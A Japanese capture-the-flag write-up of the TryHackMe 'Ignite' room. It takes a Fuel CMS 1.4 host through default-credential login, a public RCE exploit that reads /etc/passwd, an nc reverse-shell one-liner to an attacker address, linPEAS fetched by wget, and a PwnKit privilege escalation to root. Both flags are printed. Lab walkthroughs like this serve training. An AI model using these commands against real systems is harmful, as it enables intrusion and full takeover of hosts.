# Ignite CTF

https://tryhackme.com/r/room/ignite

## 偵察

### ポートスキャン

HTTP だけ。

```shell
TARGET=<ip>
$ sudo nmap $TARGET
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-12 04:17 EST
Nmap scan report for 10.10.121.207
Host is up (0.27s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
```

### DirBuster

下記のパスなどを発見

- /fule/  
  Fuel CMS というシステムのログインページ

- /0/  
  Fuel CMS のドキュメント。バージョン 1.4 と書かれている。
  管理者ログインのデフォルトは、admin/admin と書かれている。

→ admin/admin でログインできた。

Assets, Blocks の画面にアップロード機能がある。 shell.php をアップロードしようとしたが、「The filetype you are attempting to upload is not allowed.」エラー。拡張子に pdf や jpg を付けてもだめ。

### 脆弱性検索

```shell
$ searchsploit fuel | grep CMS
fuel CMS 1.4.1 - Remote Code Execution (1)                                         | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                         | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                         | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                        | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                               | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                   | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)                                 | php/webapps/50884.txt
```

## RCE

50477 でコマンドを実行できることを確認。  
応答の頭に必ず system が付いているのに注意。

```shell
$ python 50477.py -u http://$TARGET
[+]Connecting...
Enter Command $pwd
system/var/www/html
```

```shell
Enter Command $cat /etc/passwd
systemroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
```

```shell
Enter Command $cat /home/www-data/flag.txt
system6470e394cbf6dab6a91682cc8585059b
```

フラグ 1 ゲット

## 特権昇格

```shell
Enter Command $uname -r
system4.15.0-45-generic

Enter Command $cat /etc/issue
systemUbuntu 16.04.6 LTS \n \l
```
4.15.0-45-generic  
Ubuntu 16.04.6 LTS \n \l

cron, sudo, suid 何もなし。

リバースシェル起動。  
ちなみに、よく使うプログラミング言語のリバースシェルは機能しなかった。

```shell
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ip> <port> > /tmp/f
```

### linPEAS

https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

```shell
wget http://<ip>/linpeas.sh
chmod +x ./linpeas.sh
./linpeas.sh
```

この2件が目を引く。

```shell
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
```
### CVE-2021-4034
```shell
$ wget http://10.2.22.182/CVE-2021-4034-main.zip
$ unzip ./CVE-2021-4034-main.zip
$ cd CVE-2021-4034-main
$ ls
LICENSE
Makefile
README.md
cve-2021-4034.c
cve-2021-4034.sh
dry-run
pwnkit.c

$ make all
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /bin/true GCONV_PATH=./pwnkit.so:.

$ ls
GCONV_PATH=.
LICENSE
Makefile
README.md
cve-2021-4034
cve-2021-4034.c
cve-2021-4034.sh
dry-run
gconv-modules
pwnkit.c
pwnkit.so
```

```shell
$ ./cve-2021-4034
whoami
root
```
特権昇格成功！

```shell
ls /root
root.txt
cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d 
```
rootフラグゲット！

## 振り返り
- 既知の脆弱性を既知のツールを使って攻撃する内容
- プログラミング言語を使わないリバースプロキシの起動
- linPEAS 等のサジェスターツールの脅威を理解した
